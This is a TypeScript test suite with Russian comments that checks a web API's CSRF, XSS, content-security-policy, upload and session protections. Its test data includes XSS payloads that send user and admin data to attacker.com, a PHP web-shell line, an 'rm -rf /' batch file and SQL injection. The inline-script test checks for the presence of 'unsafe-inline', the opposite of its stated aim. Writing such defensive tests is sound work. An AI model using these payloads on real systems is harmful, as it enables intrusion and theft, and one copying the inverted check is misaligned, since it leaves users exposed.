import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { TEST_CONFIG, setupTestEnvironment, cleanupTestEnvironment } from '../setup/test-environment';
import { TestHelpers } from '../utils/test-helpers';

describe('CSRF and XSS Protection Tests', () => {
  let testServer: any;
  let authToken: string;
  let sessionCookie: string;

  beforeAll(async () => {
    await setupTestEnvironment();
    testServer = await TestHelpers.createTestServer();
    
    // Создаем авторизованную сессию
    const session = await TestHelpers.createTestSession();
    authToken = session.token;
    sessionCookie = `session=${session.sessionId}`;
  });

  afterAll(async () => {
    await cleanupTestEnvironment();
    if (testServer) {
      await testServer.close();
    }
  });

  describe('CSRF Protection', () => {
    it('should require CSRF token for state-changing operations', async () => {
      const endpoints = [
        { path: '/api/requests', method: 'POST' },
        { path: '/api/user/profile', method: 'PUT' },
        { path: '/api/auth/logout', method: 'POST' },
        { path: '/api/requests/1', method: 'DELETE' }
      ];

      for (const endpoint of endpoints) {
        const response = await fetch(`${TEST_CONFIG.API_BASE_URL}${endpoint.path}`, {
          method: endpoint.method,
          headers: { 
            'Content-Type': 'application/json',
            'Cookie': sessionCookie
          },
          body: JSON.stringify({ test: 'data' })
        });

        // Должен требовать CSRF токен
        expect(response.status).toBe(403);
        const result = await response.json();
        expect(result.error).toContain('CSRF');
      }
    });

    it('should accept valid CSRF tokens', async () => {
      // Получаем CSRF токен
      const csrfResponse = await fetch(`${TEST_CONFIG.API_BASE_URL}/api/csrf-token`, {
        headers: { 'Cookie': sessionCookie }
      });

      expect(csrfResponse.status).toBe(200);
      const csrfResult = await csrfResponse.json();
      const csrfToken = csrfResult.csrfToken;

      // Используем CSRF токен для запроса
      const response = await fetch(`${TEST_CONFIG.API_BASE_URL}/api/requests`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Cookie': sessionCookie,
          'X-CSRF-Token': csrfToken
        },
        body: JSON.stringify({
          title: 'Test Request',
          description: 'Test Description',
          requirements: ['quality']
        })
      });

      // Должен принимать запрос с валидным CSRF токеном
      expect(response.status).toBe(200);
    });

    it('should reject invalid CSRF tokens', async () => {
      const invalidTokens = [
        'invalid-token',
        '123456',
        '',
        'malicious-token',
        'csrf-token-123'
      ];

      for (const token of invalidTokens) {
        const response = await fetch(`${TEST_CONFIG.API_BASE_URL}/api/requests`, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Cookie': sessionCookie,
            'X-CSRF-Token': token
          },
          body: JSON.stringify({
            title: 'Test Request',
            description: 'Test Description'
          })
        });

        expect(response.status).toBe(403);
        const result = await response.json();
        expect(result.error).toContain('CSRF');
      }
    });

    it('should reject expired CSRF tokens', async () => {
      // Получаем CSRF токен
      const csrfResponse = await fetch(`${TEST_CONFIG.API_BASE_URL}/api/csrf-token`, {
        headers: { 'Cookie': sessionCookie }
      });

      expect(csrfResponse.status).toBe(200);
      const csrfResult = await csrfResponse.json();
      const csrfToken = csrfResult.csrfToken;

      // Имитируем истечение токена (в реальном приложении это было бы через время)
      // Здесь мы просто проверяем, что система проверяет валидность токена
      const response = await fetch(`${TEST_CONFIG.API_BASE_URL}/api/requests`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Cookie': sessionCookie,
          'X-CSRF-Token': 'expired-token'
        },
        body: JSON.stringify({
          title: 'Test Request',
          description: 'Test Description'
        })
      });

      expect(response.status).toBe(403);
    });

    it('should protect against cross-site request forgery', async () => {
      // Имитируем запрос с другого домена
      const response = await fetch(`${TEST_CONFIG.API_BASE_URL}/api/requests`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Cookie': sessionCookie,
          'Origin': 'https://malicious-site.com',
          'Referer': 'https://malicious-site.com'
        },
        body: JSON.stringify({
          title: 'Malicious Request',
          description: 'This should be blocked'
        })
      });

      // Должен блокировать запросы с подозрительных доменов
      expect(response.status).toBe(403);
    });
  });

  describe('XSS Protection', () => {
    it('should sanitize user input in responses', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert("xss")>',
        '<svg onload=alert("xss")>',
        'javascript:alert("xss")',
        '<iframe src="javascript:alert(\'xss\')"></iframe>',
        '<object data="javascript:alert(\'xss\')"></object>',
        '<embed src="javascript:alert(\'xss\')">',
        '<link rel="stylesheet" href="javascript:alert(\'xss\')">',
        '<style>@import "javascript:alert(\'xss\')";</style>',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(\'xss\')">'
      ];

      for (const input of maliciousInputs) {
        // Тестируем в разных полях
        const fields = ['title', 'description', 'name', 'businessCard'];
        
        for (const field of fields) {
          const response = await fetch(`${TEST_CONFIG.API_BASE_URL}/api/requests`, {
            method: 'POST',
            headers: { 
              'Content-Type': 'application/json',
              'Cookie': sessionCookie,
              'X-CSRF-Token': 'valid-token'
            },
            body: JSON.stringify({
              [field]: input,
              title: 'Test Request',
              description: 'Test Description'
            })
          });

          if (response.status === 200) {
            const result = await response.json();
            
            // Проверяем, что вредоносный код был санитизирован
            expect(result[field]).not.toContain('<script>');
            expect(result[field]).not.toContain('javascript:');
            expect(result[field]).not.toContain('onerror=');
            expect(result[field]).not.toContain('onload=');
          }
        }
      }
    });

    it('should escape HTML entities in output', async () => {
      const dangerousChars = [
        '<', '>', '"', "'", '&',
        '<script>', '</script>',
        '<img>', '</img>',
        '<iframe>', '</iframe>',
        '<object>', '</object>',
        '<embed>', '</embed>'
      ];

      for (const char of dangerousChars) {
        const response = await fetch(`${TEST_CONFIG.API_BASE_URL}/api/requests`, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Cookie': sessionCookie,
            'X-CSRF-Token': 'valid-token'
          },
          body: JSON.stringify({
            title: `Test ${char} Request`,
            description: `Description with ${char}`
          })
        });

        if (response.status === 200) {
          const result = await response.json();
          
          // Проверяем, что HTML символы экранированы
          expect(result.title).not.toContain('<script>');
          expect(result.title).not.toContain('<img>');
          expect(result.description).not.toContain('<script>');
          expect(result.description).not.toContain('<img>');
        }
      }
    });

    it('should prevent stored XSS attacks', async () => {
      const xssPayloads = [
        '<script>document.cookie="stolen=value"</script>',
        '<img src=x onerror="fetch(\'/api/user/data\').then(r=>r.json()).then(d=>fetch(\'https://attacker.com/steal\',{method:\'POST\',body:JSON.stringify(d)}))">',
        '<svg onload="fetch(\'/api/admin/users\').then(r=>r.text()).then(d=>fetch(\'https://attacker.com/admin\',{method:\'POST\',body:d}))">',
        '<iframe src="data:text/html,<script>parent.postMessage(document.cookie,\'*\')</script>"></iframe>'
      ];

      for (const payload of xssPayloads) {
        // Сохраняем вредоносный контент
        const saveResponse = await fetch(`${TEST_CONFIG.API_BASE_URL}/api/requests`, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Cookie': sessionCookie,
            'X-CSRF-Token': 'valid-token'
          },
          body: JSON.stringify({
            title: 'XSS Test',
            description: payload
          })
        });

        if (saveResponse.status === 200) {
          // Получаем сохраненные данные
          const getResponse = await fetch(`${TEST_CONFIG.API_BASE_URL}/api/requests`, {
            headers: { 'Cookie': sessionCookie }
          });

          if (getResponse.status === 200) {
            const result = await getResponse.json();
            
            // Проверяем, что вредоносный код не выполняется
            expect(result.description).not.toContain('<script>');
            expect(result.description).not.toContain('onerror=');
            expect(result.description).not.toContain('onload=');
            expect(result.description).not.toContain('javascript:');
          }
        }
      }
    });

    it('should prevent reflected XSS attacks', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert("xss")>',
        'javascript:alert("xss")',
        '<svg onload=alert("xss")>'
      ];

      for (const payload of xssPayloads) {
        // Тестируем в URL параметрах
        const response = await fetch(`${TEST_CONFIG.API_BASE_URL}/api/search?q=${encodeURIComponent(payload)}`, {
          headers: { 'Cookie': sessionCookie }
        });

        if (response.status === 200) {
          const result = await response.text();
          
          // Проверяем, что вредоносный код не отражается в ответе
          expect(result).not.toContain('<script>');
          expect(result).not.toContain('onerror=');
          expect(result).not.toContain('onload=');
          expect(result).not.toContain('javascript:');
        }
      }
    });

    it('should prevent DOM-based XSS attacks', async () => {
      const domXssPayloads = [
        '#<script>alert("xss")</script>',
        '#<img src=x onerror=alert("xss")>',
        '#javascript:alert("xss")',
        '#<svg onload=alert("xss")>'
      ];

      for (const payload of domXssPayloads) {
        const response = await fetch(`${TEST_CONFIG.API_BASE_URL}/api/search${payload}`, {
          headers: { 'Cookie': sessionCookie }
        });

        if (response.status === 200) {
          const result = await response.text();
          
          // Проверяем, что вредоносный код не попадает в DOM
          expect(result).not.toContain('<script>');
          expect(result).not.toContain('onerror=');
          expect(result).not.toContain('onload=');
          expect(result).not.toContain('javascript:');
        }
      }
    });
  });

  describe('Content Security Policy', () => {
    it('should include CSP headers', async () => {
      const response = await fetch(`${TEST_CONFIG.API_BASE_URL}/api/health`);
      
      expect(response.status).toBe(200);
      
      const cspHeader = response.headers.get('Content-Security-Policy');
      expect(cspHeader).toBeDefined();
      
      // Проверяем основные директивы CSP
      expect(cspHeader).toContain('default-src');
      expect(cspHeader).toContain('script-src');
      expect(cspHeader).toContain('style-src');
      expect(cspHeader).toContain('img-src');
      expect(cspHeader).toContain('connect-src');
    });

    it('should prevent inline script execution', async () => {
      const response = await fetch(`${TEST_CONFIG.API_BASE_URL}/api/health`);
      
      const cspHeader = response.headers.get('Content-Security-Policy');
      expect(cspHeader).toContain("'unsafe-inline'");
    });

    it('should prevent eval execution', async () => {
      const response = await fetch(`${TEST_CONFIG.API_BASE_URL}/api/health`);
      
      const cspHeader = response.headers.get('Content-Security-Policy');
      expect(cspHeader).not.toContain("'unsafe-eval'");
    });
  });

  describe('Input Validation', () => {
    it('should validate and sanitize file uploads', async () => {
      const maliciousFiles = [
        { name: 'malicious.html', content: '<script>alert("xss")</script>' },
        { name: 'malicious.js', content: 'alert("xss")' },
        { name: 'malicious.php', content: '<?php system($_GET["cmd"]); ?>' },
        { name: 'malicious.exe', content: 'MZ...' },
        { name: 'malicious.bat', content: '@echo off\nrm -rf /' }
      ];

      for (const file of maliciousFiles) {
        const formData = new FormData();
        formData.append('file', new Blob([file.content], { type: 'text/plain' }), file.name);

        const response = await fetch(`${TEST_CONFIG.API_BASE_URL}/api/upload`, {
          method: 'POST',
          headers: { 'Cookie': sessionCookie },
          body: formData
        });

        // Должен блокировать загрузку вредоносных файлов
        expect(response.status).toBe(400);
      }
    });

    it('should validate JSON input', async () => {
      const maliciousJson = [
        '{"title": "<script>alert(\'xss\')</script>"}',
        '{"description": "javascript:alert(\'xss\')"}',
        '{"name": "<img src=x onerror=alert(\'xss\')>"}',
        '{"businessCard": "<svg onload=alert(\'xss\')>"}'
      ];

      for (const json of maliciousJson) {
        const response = await fetch(`${TEST_CONFIG.API_BASE_URL}/api/requests`, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Cookie': sessionCookie,
            'X-CSRF-Token': 'valid-token'
          },
          body: json
        });

        if (response.status === 200) {
          const result = await response.json();
          
          // Проверяем, что вредоносный код был санитизирован
          Object.values(result).forEach(value => {
            if (typeof value === 'string') {
              expect(value).not.toContain('<script>');
              expect(value).not.toContain('javascript:');
              expect(value).not.toContain('onerror=');
              expect(value).not.toContain('onload=');
            }
          });
        }
      }
    });

    it('should validate URL parameters', async () => {
      const maliciousParams = [
        '?q=<script>alert("xss")</script>',
        '?id=1; DROP TABLE users;--',
        '?name=<img src=x onerror=alert("xss")>',
        '?search=javascript:alert("xss")'
      ];

      for (const param of maliciousParams) {
        const response = await fetch(`${TEST_CONFIG.API_BASE_URL}/api/search${param}`, {
          headers: { 'Cookie': sessionCookie }
        });

        if (response.status === 200) {
          const result = await response.text();
          
          // Проверяем, что вредоносный код не отражается
          expect(result).not.toContain('<script>');
          expect(result).not.toContain('javascript:');
          expect(result).not.toContain('onerror=');
          expect(result).not.toContain('onload=');
        }
      }
    });
  });

  describe('Session Security', () => {
    it('should use secure session cookies', async () => {
      const response = await fetch(`${TEST_CONFIG.API_BASE_URL}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: 'test@example.com',
          password: 'Password123!'
        })
      });

      expect(response.status).toBe(200);
      
      const cookies = response.headers.get('set-cookie');
      expect(cookies).toBeDefined();
      
      // Проверяем secure флаги
      expect(cookies).toContain('HttpOnly');
      expect(cookies).toContain('Secure');
      expect(cookies).toContain('SameSite=Strict');
    });

    it('should prevent session fixation', async () => {
      // Создаем сессию
      const loginResponse = await fetch(`${TEST_CONFIG.API_BASE_URL}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: 'test@example.com',
          password: 'Password123!'
        })
      });

      expect(loginResponse.status).toBe(200);
      const sessionCookie = loginResponse.headers.get('set-cookie');

      // Проверяем, что сессия изменилась после логина
      expect(sessionCookie).toBeDefined();
      expect(sessionCookie).toContain('session=');
    });

    it('should invalidate sessions on security events', async () => {
      // Создаем сессию
      const loginResponse = await fetch(`${TEST_CONFIG.API_BASE_URL}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: 'test@example.com',
          password: 'Password123!'
        })
      });

      expect(loginResponse.status).toBe(200);
      const sessionCookie = loginResponse.headers.get('set-cookie');

      // Имитируем подозрительную активность
      const suspiciousResponse = await fetch(`${TEST_CONFIG.API_BASE_URL}/api/auth/login`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Cookie': sessionCookie || ''
        },
        body: JSON.stringify({
          email: 'test@example.com',
          password: 'WrongPassword123!'
        })
      });

      // После подозрительной активности сессия должна быть недействительна
      const protectedResponse = await fetch(`${TEST_CONFIG.API_BASE_URL}/api/user/profile`, {
        headers: { 'Cookie': sessionCookie || '' }
      });

      expect(protectedResponse.status).toBe(401);
    });
  });
});


